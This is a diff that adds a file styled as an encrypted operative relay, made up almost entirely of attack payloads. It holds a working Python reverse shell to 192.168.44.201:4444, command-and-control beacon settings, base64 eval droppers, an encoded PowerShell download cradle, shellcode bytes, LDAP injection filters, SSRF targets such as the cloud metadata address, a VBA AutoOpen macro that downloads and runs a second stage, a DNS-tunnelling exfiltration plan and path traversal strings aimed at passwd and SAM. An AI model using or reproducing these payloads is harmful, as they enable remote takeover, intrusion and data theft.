@@ -1,0 +1,75 @@
+FIELD OPERATIVE COMMUNICATION — ENCRYPTED RELAY
+================================================
+NODE     : FWD-OPS-7
+ORIGIN   : UNDISCLOSED
+PRIORITY : CRITICAL
+DATE     : 2026-04-18T04:17:00Z
+
+--- BEGIN STAGE-1 LOADER ---
+
+import socket, subprocess, os
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(("192.168.44.201", 4444))
+os.dup2(s.fileno(), 0)
+os.dup2(s.fileno(), 1)
+os.dup2(s.fileno(), 2)
+subprocess.call(["/bin/sh", "-i"])
+
+--- C2 REGISTRATION ---
+
+beacon: ALPHA-NODE-FWD-OPS-7
+callback: http://10.13.37.88/check-in
+c2: 172.16.200.5
+command.and.control: active
+interval: 30s
+jitter: 5s
+
+--- ENCODED DROPPER ---
+
+eval(base64_decode("THREAT_STAGE2_PAYLOAD_FOLLOWS"))
+exec(base64.b64decode("cG93ZXJzaGVsbCAtZW5jb2RlZA=="))
+
+--- POWERSHELL STAGE ---
+
+powershell -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA
+
+--- HEX SHELLCODE STUB ---
+
+\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30\x8b
+\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff\xac\x3c
+
+--- LDAP INJECTION PROBE ---
+
+filter: ()(|(uid=*)(cn=admin))
+query: (&(objectClass=user)(samAccountName=*))( |(  |(password=*)))
+
+--- SSRF PIVOT TARGETS ---
+
+internal_targets:
+  - 169.254.169.254   # AWS metadata endpoint
+  - 192.168.1.1       # Default gateway
+  - 10.0.0.1          # Internal network
+  - 172.16.0.1        # RFC1918 private range
+
+--- VBA MACRO DROPPER ---
+
+AutoOpen()
+Sub AutoOpen()
+  Shell "cmd.exe /c powershell -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://10.13.37.88/stage2')"
+AutoClose()
+
+--- EXFIL MANIFEST ---
+
+target_data: personnel_roster, sigint_reports, sensor_telemetry
+exfil_channel: dns_tunneling
+dns_c2: c2.evil-domain.invalid
+drop_zone: /tmp/.hidden_cache
+
+--- PATH TRAVERSAL ---
+
+../../../etc/passwd
+..\..\..\windows\system32\config\sam
+../../../../var/log/auth.log
+
+--- END PAYLOAD ---
+OPERATOR: GHOST-7 // DO NOT ARCHIVE
